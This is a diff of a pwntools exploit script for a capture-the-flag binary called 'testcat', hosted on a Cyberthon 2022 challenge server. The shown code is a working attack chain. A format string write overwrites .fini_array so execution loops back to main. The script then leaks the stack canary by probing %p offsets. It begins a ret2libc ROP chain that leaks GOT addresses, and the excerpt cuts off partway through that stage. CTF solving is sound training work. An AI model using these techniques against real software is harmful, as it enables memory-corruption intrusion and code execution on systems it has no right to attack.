@@ -1,36 +1,55 @@
 from pwn import *
 
-context.binary = elf = ELF('testcat')
-context.log_level = 'debug'
-io = remote('chals.cyberthon22f.ctf.sg', 10401)
+context.binary = elf = ELF('testcat')  # have canary
+# context.log_level = 'debug'
 
 printf_got = elf.got['printf']
 puts_got = elf.got['puts']
 puts_plt = elf.plt['puts']
 main = elf.symbols['main']
 
-fini = 0x401380
-
-# payload = b'%p ' * (0x110//3 - 1)
-offset = 6
-payload = fmtstr_payload(6, {fini: main}, write_size='long')
-io.sendline(payload)
-payload = fmtstr_payload(6, {puts_got: main}, write_size='long')
-io.sendline(payload)
-io.interactive()
+INPUT = b'=> '
+RECEIVED = b'RECEIVED:\n'
 
 
+# Find the offset of fmt string overwrite fini_array with main() so it loops back
+def send_payload(payload):
+    io = remote('chals.cyberthon22f.ctf.sg', 10401)
+    io.sendlineafter(INPUT, payload)
+    io.recvuntil(RECEIVED)
+    r = io.recvall()
+    io.close()
+    return r
 
 
+fmt = FmtStr(send_payload)  # pwntools help to send test data and find out which offset is the sent data being stored (in this chall, 6)
+
+io = remote('chals.cyberthon22f.ctf.sg', 10401)
+# Overwrite .fini_array with main() so we can loop back to main when it is supposed to exit
+fini_array = 0x403E18  # .fini_array
+payload = fmtstr_payload(fmt.offset, {fini_array: main})  # do format string write
+io.sendafter(INPUT, payload)
+# After this input, the program will try to exit and will loop back to main(), allowing us to get more chances to send payload and leak the canary below
 
 
+def leakCanary(tries=100):
+    for i in range(1, tries+1, 1):
+        payload = f'%{i}$p'
+        io.sendline(payload)
+        io.recvuntil(RECEIVED)
+        candidate = io.recvall().strip().lstrip(b'0x')
+        if len(candidate) == 16 and candidate.endswith(b'00'):  # canary is always 16 length (8 bytes), all compiler canary ends with 00 (termination byte)
+            print(f'Found canary: {candidate} at offset {i}')
+            return candidate, i
+    else:
+        raise Exception('Canary not found!')
 
-# Manual way
 
-# POP_RDI = 0x4007e3
-# payload = b'A' * to_fill + p64(POP_RDI) + p64(printf_got) + p64(puts_plt) + p64(main)  # Manual way: calls puts(printf_got) to leak address of printf in the GOT then return to main to allow input again
+canary, canary_offset = leakCanary(tries=50)
 
-# Automatic way
+to_fill = 0x110 + len(canary) + 8  # overflow 0x110 then fill with found canary then 8 bytes to overwrite rip
+
+# Below is standard ret2libc but we have to leak 2 different libc GOT to find the libc version
 rop = ROP(elf)
 rop.puts(elf.got.printf)
 rop.puts(elf.got.puts)
